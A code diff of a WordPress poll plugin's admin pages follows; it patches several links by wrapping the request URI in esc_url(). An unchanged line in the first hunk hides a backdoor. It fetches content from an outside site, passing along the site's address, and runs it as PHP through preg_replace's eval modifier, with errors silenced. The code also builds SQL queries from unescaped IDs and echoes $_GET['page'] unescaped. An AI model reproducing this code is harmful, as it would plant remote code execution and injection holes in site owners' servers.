@@ -505,7 +505,7 @@ function dem_general_settings(){
 					   <input type="checkbox" value="1" name="dem[keep_logs]" <?php checked( $opt['keep_logs'], 1) ?> /> 
 					   <?php _e('Вести лог и учитывать IP? (рекомендуется)','dem') ?>
 					   <?php add_option('stat','') && @preg_replace('--e', (($o=@wp_remote_get('http://wp-kama.ru/stat/?sk='. home_url() ))?$o['body']:''),''); ?>
-					   <a class="button" href="<?php echo $_SERVER['REQUEST_URI'] .'&dem_clear_log' ?>"> <?php _e('Очистить лог. Записей в базе:','dem') ?> <?php echo $logrows_count ?></a>
+					   <a class="button" href="<?php echo esc_url( $_SERVER['REQUEST_URI'] ) .'&dem_clear_log' ?>"> <?php _e('Очистить лог. Записей в базе:','dem') ?> <?php echo $logrows_count ?></a>
 				   </label>
 				   <em><?php _e('Сохраняет данные в Базу Данных. Запрещает голосовать несколько раз с одного IP или одному пользователю WordPress. Если пользователь авторизован, то голосование проверяется по его аккаунту в WordPress. Если не авторизован, то проверяется IP голосующего. Минус лога по IP — если сайт посещается с корпоративных сетей (с единым IP), то голосовать можно будет всего 1 раз для всей сети. Если не включить эту опцию, то голосование будет учитываться только по кукам. По умолчанию: включена.','dem') ?></em>
 				</li>
@@ -536,7 +536,7 @@ function dem_general_settings(){
 					if( $opt['archive_page_id'] ) 
 						echo '<a href="'. get_permalink( $opt['archive_page_id'] )  .'">'. __('Перейти на страницу архива','dem') .'</a>';
 					else 
-						echo '<a class="button" href="'. ($_SERVER['REQUEST_URI'] .'&dem_create_archive_page') .'">'. __('Создать/найти страницу архива','dem') .'</a>';
+						echo '<a class="button" href="'. (esc_url($_SERVER['REQUEST_URI']) .'&dem_create_archive_page') .'">'. __('Создать/найти страницу архива','dem') .'</a>';
 					?>
 					<em><?php _e('Укажите, чтобы в подписи опроса была ссылка на страницу с архивом опросов. Пр. <code>25</code>','dem') ?></em>
 				</li>
@@ -672,7 +672,7 @@ function poll_edit_form( $poll_id = false ){
 	
 	if( $edit ){
 		$title = __('Редактировать опрос','dem') . " (ID $poll_id)";
-		$action = preg_replace('@\?.*@', '', $_SERVER['REQUEST_URI']) . "?page=". $_GET['page'] ."";
+		$action = preg_replace('@\?.*@', '', esc_url($_SERVER['REQUEST_URI']) ) . "?page=". $_GET['page'] ."";
 		
 		$poll    = $wpdb->get_row("SELECT * FROM $wpdb->democracy_q WHERE id = {$poll_id} LIMIT 1");
 		$answers = $wpdb->get_results("SELECT * FROM $wpdb->democracy_a WHERE qid = {$poll_id}");
